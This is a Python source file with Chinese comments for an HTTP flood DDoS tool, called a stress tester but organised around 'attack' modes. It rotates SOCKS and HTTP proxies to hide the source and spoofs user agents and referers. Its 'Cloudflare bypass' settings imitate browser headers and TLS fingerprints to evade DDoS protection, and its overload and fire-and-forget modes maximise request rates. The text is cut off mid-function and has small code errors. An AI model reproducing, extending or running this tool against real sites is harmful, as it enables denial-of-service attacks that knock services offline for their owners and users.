#!/usr/bin/python3
"""
DDoS压力测试工具
功能特点:
1. 支持多种攻击模式: cc/get/post/head/check
2. 从配置文件读取headers和referers 
3. 完善的错误处理和日志记录
4. 优化的资源管理和并发控制
"""

import argparse
import socket
import time
import random
import threading
import sys
import ssl
import datetime
import logging
import gc
import queue
import os
from contextlib import contextmanager
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Semaphore, BoundedSemaphore

# 延迟导入，避免启动时错误
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("警告: PySocks未安装，SOCKS代理功能不可用")
    print("安装命令: pip install PySocks")


@dataclass
class Config:
    """配置类，集中管理所有配置项"""
    proxy_file: str = "config/socks5.txt"
    request_timeout: int = 10
    connection_timeout: int = 5
    max_retries: int = 3
    user_agents_file: Optional[str] = None
    output_log: str = "logs/attack.log"
    cf_bypass: bool = False  # Cloudflare绕过优化
    http2_support: bool = False  # HTTP/2支持
    # 超负荷运转模式配置
    overload_mode: bool = False  # 超负荷模式
    max_connections_per_proxy: int = 50  # 每代理最大连接数
    connection_pool_size: int = 1000  # 连接池大小
    request_queue_size: int = 10000  # 请求队列大小
    burst_mode: bool = False  # 爆发模式
    no_delay: bool = False  # 无延迟模式
    memory_aggressive: bool = False  # 内存激进模式
    fire_and_forget: bool = False  # 纯发送模式(不接收响应)
    socket_reuse: bool = False  # Socket重用
    tcp_nodelay: bool = False  # TCP无延迟
    disable_nagle: bool = False  # 禁用Nagle算法
    # 代理类型配置
    proxy_type: str = "socks5"  # socks5, socks4, http
    http_proxy_file: Optional[str] = "config/http_proxies.txt"  # HTTP代理文件


class UserAgentGenerator:
    """用户代理生成器"""
    
    PLATFORMS = ['Macintosh', 'Windows']
    MAC_OS = ['68K', 'PPC', 'Intel Mac OS X']
    WIN_OS = ['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 
              'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 
              'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 
              'Windows NT 10.0; Win64; x64']
    BROWSERS = ['chrome', 'firefox', 'ie']
    
    @classmethod
    def generate(cls) -> str:
        """生成随机用户代理"""
        platform = random.choice(cls.PLATFORMS)
        os = random.choice(cls.MAC_OS if platform == 'Macintosh' else cls.WIN_OS)
        browser = random.choice(cls.BROWSERS)
        
        if browser == 'chrome':
            webkit = str(random.randint(500, 599))
            version = f"{random.randint(0, 99)}.0{random.randint(0, 9999)}.{random.randint(0, 999)}"
            return f'Mozilla/5.0 ({os}) AppleWebKit/{webkit}.0 (KHTML, like Gecko) Chrome/{version} Safari/{webkit}'
        elif browser == 'firefox':
            current_year = datetime.date.today().year
            year = str(random.randint(2020, current_year))
            month = f"{random.randint(1, 12):02d}"
            day = f"{random.randint(1, 30):02d}"
            gecko = f"{year}{month}{day}"
            version = f"{random.randint(1, 72)}.0"
            return f'Mozilla/5.0 ({os}; rv:{version}) Gecko/{gecko} Firefox/{version}'
        else:  # ie
            version = f"{random.randint(1, 99)}.0"
            engine = f"{random.randint(1, 99)}.0"
            token = f"{random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64'])}; " if random.choice([True, False]) else ''
            return f'Mozilla/5.0 (compatible; MSIE {version}; {os}; {token}Trident/{engine})'


class HTTPHeaderGenerator:
    """HTTP头部生成器"""
    
    # 默认配置，当配置文件不存在时使用
    DEFAULT_ACCEPT_HEADERS = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
    ]
    
    DEFAULT_REFERERS = [
        "https://www.google.com/search?q=",
        "https://www.facebook.com/",
        "https://www.youtube.com/",
        "https://www.bing.com/search?q="
    ]
    
    @classmethod
    def load_accept_headers(cls) -> List[str]:
        """从配置文件加载Accept headers"""
        try:
            with open("config/accept_headers.txt", "r", encoding="utf-8") as f:
                headers = [line.strip() + "\r\n" for line in f if line.strip()]
            return headers if headers else cls.DEFAULT_ACCEPT_HEADERS
        except FileNotFoundError:
            print("警告: config/accept_headers.txt 文件未找到，使用默认headers")
            return cls.DEFAULT_ACCEPT_HEADERS
        except Exception as e:
            print(f"错误: 加载config/accept_headers.txt失败: {e}")
            return cls.DEFAULT_ACCEPT_HEADERS
    
    @classmethod
    def load_referers(cls) -> List[str]:
        """从配置文件加载Referers"""
        try:
            with open("config/referers.txt", "r", encoding="utf-8") as f:
                referers = [line.strip() for line in f if line.strip()]
            return referers if referers else cls.DEFAULT_REFERERS
        except FileNotFoundError:
            print("警告: config/referers.txt 文件未找到，使用默认referers")
            return cls.DEFAULT_REFERERS
        except Exception as e:
            print(f"错误: 加载config/referers.txt失败: {e}")
            return cls.DEFAULT_REFERERS
    
    def __init__(self, cf_bypass=False):
        """初始化时加载配置文件"""
        self.ACCEPT_HEADERS = self.load_accept_headers()
        self.REFERERS = self.load_referers()
        self.cf_bypass = cf_bypass
        
        # CF绕过专用headers
        self.CF_BYPASS_HEADERS = [
            "sec-ch-ua: \"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
            "sec-ch-ua-mobile: ?0",
            "sec-ch-ua-platform: \"Windows\"",
            "sec-fetch-dest: document",
            "sec-fetch-mode: navigate",
            "sec-fetch-site: none",
            "sec-fetch-user: ?1",
            "upgrade-insecure-requests: 1",
            "cache-control: max-age=0"
        ]
    
    def generate_get_header(self, target: str, path: str, cookies: str = "") -> str:
        """生成GET请求头部"""
        headers = []
        
        # 基础headers
        accept = random.choice(self.ACCEPT_HEADERS)
        headers.append(accept)
        
        referer = f"Referer: {random.choice(self.REFERERS)}{target}{path}\r\n"
        headers.append(referer)
        
        user_agent = f"User-Agent: {UserAgentGenerator.generate()}\r\n"
        headers.append(user_agent)
        
        # CF绕过优化headers
        if self.cf_bypass:
            # 添加现代浏览器特征
            headers.extend([
                "sec-ch-ua: \"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"\r\n",
                "sec-ch-ua-mobile: ?0\r\n",
                "sec-ch-ua-platform: \"Windows\"\r\n",
                "sec-fetch-dest: document\r\n",
                "sec-fetch-mode: navigate\r\n",
                "sec-fetch-site: cross-site\r\n",
                "sec-fetch-user: ?1\r\n",
                "upgrade-insecure-requests: 1\r\n",
                "cache-control: no-cache\r\n",
                "pragma: no-cache\r\n"
            ])
            
        # 连接和Cookie
        connection = "Connection: keep-alive\r\n"
        if cookies:
            connection += f"Cookie: {cookies}\r\n"
        headers.append(connection)
        
        return "".join(headers) + "\r\n"
    
    def generate_post_header(self, target: str, path: str, data: str, cookies: str = "") -> str:
        """生成POST请求头部"""
        post_host = f"POST {path} HTTP/1.1\r\nHost: {target}\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
        referer = f"Referer: http://{target}{path}\r\n"
        user_agent = f"User-Agent: {UserAgentGenerator.generate()}\r\n"
        accept = random.choice(self.ACCEPT_HEADERS)
        
        length = f"Content-Length: {len(data)}\r\nConnection: Keep-Alive\r\n"
        if cookies:
            length += f"Cookies: {cookies}\r\n"
        
        return post_host + accept + referer + content + user_agent + length + "\n" + data + "\r\n\r\n"


class URLParser:
    """URL解析器"""
    
    @staticmethod
    def parse(url: str) -> Tuple[str, str, int, str]:
        """
        解析URL返回 (target, path, port, protocol)
        """
        url = url.strip()
        path = "/"
        port = 80
        protocol = "http"
        
        if url.startswith("http://"):
            url = url[7:]
        elif url.startswith("https://"):
            url = url[8:]
            protocol = "https"
            port = 443
        
        parts = url.split("/")
        website = parts[0]
        
        # 解析端口
        if ":" in website:
            target, port_str = website.split(":")
            port = int(port_str)
        else:
            target = website
        
        # 解析路径
        if len(parts) > 1:
            path = "/" + "/".join(parts[1:])
        
        return target, path, port, protocol


class ConnectionPool:
    """高性能连接池"""
    
    def __init__(self, config: Config, proxy_manager):
        self.config = config
        self.proxy_manager = proxy_manager
        self.pools = {}  # {proxy_str: [connections]}
        self.pool_locks = {}  # {proxy_str: lock}
        self.connection_semaphore = Semaphore(config.connection_pool_size)
        self.active_connections = 0
        self.logger = logging.getLogger(__name__)
        
    def get_connection(self, target: str, port: int, protocol: str):
        """从连接池获取连接"""
        # 如果是直连模式，直接创建连接
        if self.config.proxy_type == "direct":
            return self._create_direct_connection(target, port, protocol)
            
        proxy = self.proxy_manager.get_random_proxy()
        if not proxy:
            return None, None
            
        proxy_str = f"{proxy[0]}:{proxy[1]}"
        
        # 初始化代理的连接池
        if proxy_str not in self.pools:
            self.pools[proxy_str] = queue.Queue(maxsize=self.config.max_connections_per_proxy)
            self.pool_locks[proxy_str] = threading.Lock()
        
        # 尝试从池中获取连接
        try:
            conn = self.pools[proxy_str].get_nowait()
            if self._test_connection(conn):
                return conn, proxy_str
            else:
                # 连接失效，关闭并创建新连接
                try:
                    conn.close()
                except:
                    pass
        except queue.Empty:
            pass
        
        # 创建新连接
        return self._create_connection(target, port, protocol, proxy, proxy_str)
    
    def return_connection(self, conn, proxy_str: str):
        """归还连接到池中"""
        if proxy_str in self.pools:
            try:
                self.pools[proxy_str].put_nowait(conn)
            except queue.Full:
                # 池已满，关闭连接
                try:
                    conn.close()
                except:
                    pass
    
    def _create_direct_connection(self, target: str, port: int, protocol: str):
        """创建直连连接"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # 设置超时
            s.settimeout(self.config.connection_timeout)
            
            # 连接优化
            if self.config.overload_mode:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            s.connect((target, port))
            
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                if self.config.overload_mode:
                    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256')
                    ctx.options |= ssl.OP_NO_COMPRESSION
                elif self.config.cf_bypass:
                    ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
                    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                    
                s = ctx.wrap_socket(s, server_hostname=target)
            
            self.active_connections += 1
            return s, "direct"
            
        except Exception as e:
            self.logger.debug(f"直连创建失败: {e}")
            return None, None

    def _create_connection(self, target: str, port: int, protocol: str, proxy: Tuple, proxy_str: str):
        """创建新连接"""
        try:
            if self.config.proxy_type == "http":
                return self._create_http_proxy_connection(target, port, protocol, proxy, proxy_str)
            else:
                return self._create_socks_connection(target, port, protocol, proxy, proxy_str)
        except Exception as e:
            self.logger.debug(f"连接创建失败: {e}")
            return None, None
    
    def _create_socks_connection(self, target: str, port: int, protocol: str, proxy: Tuple, proxy_str: str):
        """创建SOCKS代理连接"""
        if not SOCKS_AVAILABLE:
            raise Exception("SOCKS代理不可用，请安装PySocks: pip install PySocks")
        
            s = socks.socksocket()
        
        # 设置代理类型
        if self.config.proxy_type == "socks4":
            s.set_proxy(socks.SOCKS4, proxy[0], proxy[1])
        else:  # socks5
            s.set_proxy(socks.SOCKS5, proxy[0], proxy[1])
        
        # 超负荷模式优化
        if self.config.overload_mode:
            s.settimeout(1)  # 极短超时
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # 设置接收缓冲区
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024)
        else:
            s.settimeout(self.config.connection_timeout)
        
        s.connect((target, port))
        
        if protocol == "https":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            if self.config.overload_mode:
                # 极简TLS配置以提高性能
                ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256')
                ctx.options |= ssl.OP_NO_COMPRESSION
            elif self.config.cf_bypass:
                ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
                ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                
            s = ctx.wrap_socket(s, server_hostname=target)
            
        self.active_connections += 1
        return s, proxy_str
    
    def _create_http_proxy_connection(self, target: str, port: int, protocol: str, proxy: Tuple, proxy_str: str):
        """创建HTTP代理连接"""
        
        # HTTP代理连接开销更大
        start_time = time.time()
        
        # 创建原始socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        if self.config.overload_mode:
            s.settimeout(2)  # HTTP代理需要更长超时
        else:
            s.settimeout(self.config.connection_timeout * 2)
        
        # 连接到HTTP代理
        s.connect((proxy[0], proxy[1]))
        
        # 发送CONNECT请求建立隧道
        connect_request = f"CONNECT {target}:{port} HTTP/1.1\r\nHost: {target}:{port}\r\n\r\n"
        s.send(connect_request.encode())
        
        # 接收CONNECT响应
        response = s.recv(1024).decode()
        if "200 Connection established" not in response:
            s.close()
            raise Exception(f"HTTP代理连接失败: {response}")
        
        if protocol == "https":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            if self.config.overload_mode:
                ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256')
                ctx.options |= ssl.OP_NO_COMPRESSION
            elif self.config.cf_bypass:
                ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
                ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                
            s = ctx.wrap_socket(s, server_hostname=target)
        
        # 记录连接建立时间 (HTTP代理通常更慢)
        connection_time = time.time() - start_time
        if connection_time > 1.0:  # 超过1秒记录警告
            self.logger.debug(f"HTTP代理连接耗时: {connection_time:.2f}s")
        
        self.active_connections += 1
        return s, proxy_str
    
    def _test_connection(self, conn) -> bool:
        """测试连接是否有效"""
        try:
            # 简单检查socket状态
            return conn.fileno() != -1
        except:
            return False
    
    def cleanup(self):
        """清理连接池"""
        for proxy_str, pool in self.pools.items():
            while not pool.empty():
                try:
                    conn = pool.get_nowait()
                    conn.close()
                except:
                    pass
        self.pools.clear()
        self.active_connections = 0


class ProxyManager:
    """代理管理器"""
    
    def __init__(self, config: Config):
        self.config = config
        self.proxies: List[str] = []
        self.proxy_stats: Dict[str, int] = {}
        self.lock = threading.RLock()
        self.logger = logging.getLogger(__name__)
        
    def load_proxies(self) -> None:
        """加载代理列表"""
        try:
            with open(self.config.proxy_file, 'r', encoding='utf-8') as f:
                self.proxies = [line.strip() for line in f if line.strip() and ':' in line]
            
            # 去重
            self.proxies = list(set(self.proxies))
            self.proxy_stats = {proxy: 0 for proxy in self.proxies}
            
            if len(self.proxies) > 0:
                print(f"成功加载了 {len(self.proxies)} 个代理")
            else:
                print("代理文件为空，将使用直连模式")
                # 添加直连模式统计
                self.proxy_stats["direct"] = 0
                
        except FileNotFoundError:
            print(f"警告: 代理文件 {self.config.proxy_file} 不存在，将使用直连模式")
            self.proxies = []
            self.proxy_stats = {"direct": 0}
        except Exception as e:
            print(f"警告: 加载代理失败: {e}，将使用直连模式")
            self.proxies = []
            self.proxy_stats = {"direct": 0}
    
    def get_random_proxy(self) -> Optional[Tuple[str, int]]:
        """获取随机代理"""
        if not self.proxies:
            return None
        
        proxy_str = random.choice(self.proxies)
        try:
            host, port = proxy_str.split(':')
            return host.strip(), int(port.strip())
        except ValueError:
            self.logger.warning(f"无效代理格式: {proxy_str}")
            return None
    
    def update_proxy_stats(self, proxy_str: str, count: int) -> None:
        """更新代理统计"""
        with self.lock:
            if proxy_str in self.proxy_stats:
                self.proxy_stats[proxy_str] += count
    
    def get_total_requests(self) -> int:
        """获取总请求数"""
        with self.lock:
            return sum(self.proxy_stats.values())
    
    def check_proxies(self, target: str, port: int, protocol: str, timeout: int = 3) -> None:
        """检查代理可用性"""
        self.logger.info("开始检查代理可用性...")
        valid_proxies = []
        
        def check_single_proxy(proxy_str: str) -> None:
            try:
                host, proxy_port = proxy_str.split(':')
                proxy_port = int(proxy_port)
                
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, host, proxy_port)
                s.settimeout(timeout)
                s.connect((target, port))
                
                if protocol == "https":
                    ctx = ssl.SSLContext()
                    s = ctx.wrap_socket(s, server_hostname=target)
                
                s.send(b"GET / HTTP/1.1\r\n\r\n")
                s.close()
                valid_proxies.append(proxy_str)
                
            except Exception:
                pass  # 代理无效，忽略
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(check_single_proxy, self.proxies)
        
        self.proxies = valid_proxies
        self.proxy_stats = {proxy: 0 for proxy in self.proxies}
        
        # 保存有效代理
        with open(self.config.proxy_file, 'w', encoding='utf-8') as f:
            for proxy in self.proxies:
                f.write(proxy + '\n')
        
        self.logger.info(f"检查完成，有效代理: {len(self.proxies)} 个")


class AttackManager:
    """攻击管理器"""
    
    def __init__(self, config: Config):
        self.config = config
        self.proxy_manager = ProxyManager(config)
        self.connection_pool = ConnectionPool(config, self.proxy_manager)
        self.header_generator = HTTPHeaderGenerator(cf_bypass=config.cf_bypass)
        self.logger = logging.getLogger(__name__)
        self.running = False
        self.last_total = 0
        self.request_queue = queue.Queue(maxsize=config.request_queue_size)
        self.burst_semaphore = BoundedSemaphore(config.connection_pool_size)
        
        # 请求统计
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.last_stats_time = None
        self.last_total = 0  # 添加这个字段
        self.current_rps = 0
        self.stats_lock = threading.Lock()
        
    def setup_logging(self) -> None:
        """设置日志"""
        # 确保日志目录存在
        os.makedirs(os.path.dirname(self.config.output_log), exist_ok=True)
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.config.output_log, encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
    
    def update_stats(self, success: bool = True) -> None:
        """更新请求统计"""
        with self.stats_lock:
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
    
    def get_stats(self) -> Dict:
        """获取当前统计信息"""
        with self.stats_lock:
            current_time = time.time()
            if self.start_time is None:
                self.start_time = current_time
                self.last_stats_time = current_time
                return {
                    'total_requests': 0,
                    'successful_requests': 0,
                    'failed_requests': 0,
                    'current_rps': 0,
                    'avg_rps': 0,
                    'uptime': 0
                }
            
            # 计算当前RPS（最近1秒）
            time_diff = current_time - self.last_stats_time
            if time_diff >= 1.0:  # 每秒更新一次
                self.current_rps = (self.total_requests - self.last_total) / time_diff
                self.last_total = self.total_requests
                self.last_stats_time = current_time
            
            # 计算平均RPS
            uptime = current_time - self.start_time
            avg_rps = self.total_requests / uptime if uptime > 0 else 0
            
            return {
                'total_requests': self.total_requests,
                'successful_requests': self.successful_requests,
                'failed_requests': self.failed_requests,
                'current_rps': round(self.current_rps, 2),
                'avg_rps': round(avg_rps, 2),
                'uptime': round(uptime, 2)
            }
    
    def print_stats(self) -> None:
        """打印统计信息"""
        stats = self.get_stats()
        print(f"\r📊 总请求: {stats['total_requests']} | "
              f"成功: {stats['successful_requests']} | "
              f"失败: {stats['failed_requests']} | "
              f"当前RPS: {stats['current_rps']} | "
              f"平均RPS: {stats['avg_rps']} | "
              f"运行时间: {stats['uptime']}s", end="", flush=True)
    
    def output_stats_json(self) -> None:
        """输出JSON格式的统计信息"""
        stats = self.get_stats()
        stats_json = {
            'total_requests': stats['total_requests'],
            'successful_requests': stats['successful_requests'],
            'failed_requests': stats['failed_requests'],
            'current_rps': stats['current_rps'],
            'avg_rps': stats['avg_rps'],
            'uptime': stats['uptime']
        }
        print(f"STATS_JSON:{json.dumps(stats_json)}", flush=True)
    
    def _stats_worker(self) -> None:
        """统计工作线程"""
        while self.running:
            try:
                self.print_stats()
                self.output_stats_json()  # 输出JSON格式供web_panel解析
                time.sleep(1)  # 每秒更新一次
            except Exception as e:
                self.logger.debug(f"统计线程错误: {e}")
                time.sleep(1)
    
    @contextmanager
    def create_socket_connection(self, target: str, port: int, protocol: str):
        """创建Socket连接的上下文管理器"""
        # 如果是直连模式
        if self.config.proxy_type == "direct":
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.config.connection_timeout)
                
                # CF绕过优化：设置TCP选项
                if self.config.cf_bypass:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    
                s.connect((target, port))
                
                if protocol == "https":
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    
                    # CF绕过：模拟现代TLS配置
                    if self.config.cf_bypass:
                        ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
                        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                        
                    s = ctx.wrap_socket(s, server_hostname=target)
                
                yield s, "direct"
                
            finally:
                if s:
                    try:
                        s.close()
                    except:
                        pass
            return
        
        # 代理模式
        proxy = self.proxy_manager.get_random_proxy()
        if not proxy:
            raise Exception("没有可用代理")
        
        s = None
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, proxy[0], proxy[1])
            s.settimeout(self.config.connection_timeout)
            
            # CF绕过优化：设置TCP选项
            if self.config.cf_bypass:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                
            s.connect((target, port))
            
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                # CF绕过：模拟现代TLS配置
                if self.config.cf_bypass:
                    ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
                    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                    
                s = ctx.wrap_socket(s, server_hostname=target)
            
            yield s, f"{proxy[0]}:{proxy[1]}"
            
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass
    
    def attack_worker(self, mode: str, target: str, path: str, port: int, protocol: str, 
                     rps: int, cookies: str = "") -> None:
        """攻击工作线程"""
        if self.config.fire_and_forget:
            self._fire_and_forget_worker(mode, target, path, port, protocol, rps, cookies)
        else:
            self._normal_worker(mode, target, path, port, protocol, rps, cookies)
    
    def _fire_and_forget_worker(self, mode: str, target: str, path: str, port: int, protocol: str,
                               rps: int, cookies: str = "") -> None:
        """纯发送模式工作线程 - 极限性能"""
        connection_cache = {}  # 本地连接缓存
        request_cache = {}  # 请求缓存
        
        while self.running:
            try:
                # 批量处理请求以提高效率
                batch_size = min(rps, 100) if not self.config.burst_mode else rps * 2
                
                for _ in range(batch_size):
                    if not self.running:
                        break
                    
                    # 尝试重用连接
                    conn, proxy_str = self._get_cached_connection(
                        connection_cache, target, port, protocol
                    )
                    
                    if conn:
                        try:
                            # 生成或重用请求数据
                            request_data = self._get_cached_request(
                                request_cache, mode, target, path, cookies
                            )
                            
                            # 纯发送 - 不等待响应
                            conn.send(request_data)
                            
                            # 统计更新
                            self.proxy_manager.update_proxy_stats(proxy_str, 1)
                            self.update_stats(success=True)
                            
                            # 超负荷模式无延迟
                            if not self.config.no_delay and not self.config.overload_mode:
                                time.sleep(0.001)
                                
                        except Exception:
                            # 连接失效，移除缓存
                            if proxy_str in connection_cache:
                                try:
                                    connection_cache[proxy_str].close()
                                except:
                                    pass
                                del connection_cache[proxy_str]
                            # 记录失败统计
                            self.update_stats(success=False)
                    else:
                        # 无法获取连接，记录失败统计
                        self.update_stats(success=False)
                
                # 批量间隔
                if not self.config.no_delay:
                    time.sleep(0.01)
                    
            except Exception as e:
                self.logger.debug(f"Fire-and-forget worker error: {e}")
                time.sleep(0.05)
                
        # 清理连接缓存
        for conn in connection_cache.values():
            try:
                conn.close()
            except:
                pass
    
    def _normal_worker(self, mode: str, target: str, path: str, port: int, protocol: str,
                      rps: int, cookies: str = "") -> None:
        """正常模式工作线程"""
        while self.running:
            try:
                with self.create_socket_connection(target, port, protocol) as (s, proxy_str):
                    for _ in range(rps):
                        if not self.running:
                            break
                        
                        success = self._send_request(s, mode, target, path, cookies)
                        if success:
                            if proxy_str != "direct":
                                self.proxy_manager.update_proxy_stats(proxy_str, 1)
                            else:
                                # 直连模式统计
                                self.proxy_manager.update_proxy_stats("direct", 1)
                            self.update_stats(success=True)
                        else:
                            self.update_stats(success=False)
                            break
                            
            except Exception as e:
                self.logger.debug(f"攻击线程错误: {e}")
                time.sleep(0.1)
    
    def _get_cached_connection(self, cache: dict, target: str, port: int, protocol: str):
        """获取缓存连接或创建新连接"""
        # 尝试重用现有连接
        for proxy_str, conn in list(cache.items()):
            try:
                # 快速连接测试 - 检查socket状态
                if hasattr(conn, 'fileno') and conn.fileno() != -1:
                    return conn, proxy_str
                else:
                    raise Exception("连接已关闭")
            except:
                # 连接失效，移除
                try:
                    conn.close()
                except:
                    pass
                del cache[proxy_str]
        
        # 创建新连接
        conn, proxy_str = self.connection_pool.get_connection(target, port, protocol)
        if conn and proxy_str:
            # 优化连接设置
            if self.config.tcp_nodelay or self.config.disable_nagle:
                try:
                    conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except:
                    pass
            
            # 缓存连接
            cache[proxy_str] = conn
            return conn, proxy_str
        
        return None, None
    
    def _get_cached_request(self, cache: dict, mode: str, target: str, path: str, cookies: str) -> bytes:
        """获取缓存请求或生成新请求"""
        cache_key = f"{mode}_{target}_{path}_{cookies}"
        
        if cache_key in cache:
            # 重用请求，只修改时间戳参数
            base_request = cache[cache_key]
            if self.config.overload_mode:
                return base_request  # 完全重用
            else:
                # 简单修改时间戳
                timestamp = str(int(time.time() * 1000))
                return base_request.replace(b'TIMESTAMP', timestamp.encode())
        
        # 生成新请求
        request = self._generate_optimized_request(mode, target, path, cookies)
        cache[cache_key] = request
        return request
    
    def _generate_optimized_request(self, mode: str, target: str, path: str, cookies: str) -> bytes:
        """生成优化的请求数据"""
        if mode == "get" or mode == "cc":
            # 简化的GET请求
            if self.config.overload_mode:
                # 极简请求
                request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
            else:
                # 带参数的请求
                timestamp = "TIMESTAMP"  # 占位符，稍后替换
                request_path = f"{path}?t={timestamp}"
                request = f"GET {request_path} HTTP/1.1\r\nHost: {target}\r\n"
                request += self.header_generator.generate_get_header(target, path, cookies)
        
        elif mode == "post":
            # 简化的POST请求
            if self.config.overload_mode:
                data = "data=test"
                request = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(data)}\r\nConnection: close\r\n\r\n{data}"
            else:
                data = self._generate_random_string(16)
                request = self.header_generator.generate_post_header(target, path, data, cookies)
        
        elif mode == "head":
            request = f"HEAD {path} HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
        
        else:
            request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
        
        return request.encode('utf-8')
    
    def _send_request(self, socket_conn, mode: str, target: str, path: str, cookies: str) -> bool:
        """发送单个请求"""
        try:
            if mode == "get" or mode == "cc":
                # CF绕过优化：使用更真实的参数
                if self.config.cf_bypass:
                    random_params = [
                        f"t={int(time.time())}{random.randint(100, 999)}",
                        f"_={int(time.time() * 1000)}",
                        f"v={random.randint(1, 99)}.{random.randint(0, 9)}.{random.randint(0, 99)}",
                        f"ref={random.choice(['organic', 'direct', 'social'])}"
                    ]
                    random_param = "&".join(random.sample(random_params, random.randint(1, 3)))
                else:
                    random_param = self._generate_random_string()
                    
                separator = "&" if "?" in path else "?"
                request_path = f"{path}{separator}{random_param}"
                
                # HTTP版本优化
                http_version = "HTTP/1.1" if not self.config.cf_bypass else random.choice(["HTTP/1.1", "HTTP/2"])
                request = f"GET {request_path} {http_version}\r\nHost: {target}\r\n"
                request += self.header_generator.generate_get_header(target, path, cookies)
                
            elif mode == "head":
                random_param = self._generate_random_string()
                separator = "&" if "?" in path else "?"
                request_path = f"{path}{separator}{random_param}"
                
                request = f"HEAD {request_path} HTTP/1.1\r\nHost: {target}\r\n"
                request += self.header_generator.generate_get_header(target, path, cookies)
                
            elif mode == "post":
                # CF绕过：更真实的POST数据
                if self.config.cf_bypass:
                    post_data = {
                        'action': random.choice(['search', 'login', 'submit', 'update']),
                        'token': self._generate_random_string(32),
                        'timestamp': str(int(time.time())),
                        'data': self._generate_random_string(random.randint(10, 50))
                    }
                    data = "&".join([f"{k}={v}" for k, v in post_data.items()])
                else:
                    data = self._generate_random_string(length=16)
                    
                request = self.header_generator.generate_post_header(target, path, data, cookies)
            
            else:
